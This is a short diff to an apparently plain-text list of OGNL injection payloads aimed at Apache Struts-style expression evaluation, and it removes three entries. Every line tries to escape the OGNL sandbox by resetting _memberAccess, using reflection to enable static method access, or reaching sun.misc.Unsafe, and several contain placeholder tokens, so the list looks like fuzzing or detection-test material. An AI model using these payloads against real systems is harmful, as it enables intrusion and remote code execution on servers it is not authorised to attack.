@@ -7,9 +7,7 @@
 %{#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET,@sun.misc.Unsafe@getUnsafe()}
 %{(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@sun.misc.Unsafe@getUnsafe())}
 %{#a["a"]=true,#context["a"]=false,@a@a()}
-%{#a["a"]=true,#context["a"]=false,@a@a()}
 %{#_memberAccess=@a@a,@a@a()}
-%{#a=true,#context["a"]=false,@sun.misc.Unsafe@getUnsafe()}
 %{#f.setAccessible(true),#f.set(#_memberAccess,true),#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),@sun.misc.Unsafe@getUnsafe()}
 %{#_memberAccess=@EMPTY_SET@java.util.Collections,@sun.misc.Unsafe@getUnsafe()}
 %{#allowStaticMethodAccess=true,#context["a"]=false,@sun.misc.Unsafe@getUnsafe()}
@@ -22,7 +20,6 @@
 %{@ognl.OgnlContext,@sun.misc.Unsafe@getUnsafe()}
 %{#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),@sun.misc.Unsafe@getUnsafe()}
 %{(#dm=@ognl.OgnlContext@a).(@sun.misc.Unsafe@getUnsafe())}
-%{(@sun.misc.Unsafe@getUnsafe()).(#_memberAccess.a=true).(#context["a"]=false)}
 %{#_memberAccess["a"]=a,@sun.misc.Unsafe@getUnsafe()}
 %{@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@sun.misc.Unsafe@getUnsafe()}
 %{#f.set(#_memberAccess,a)}
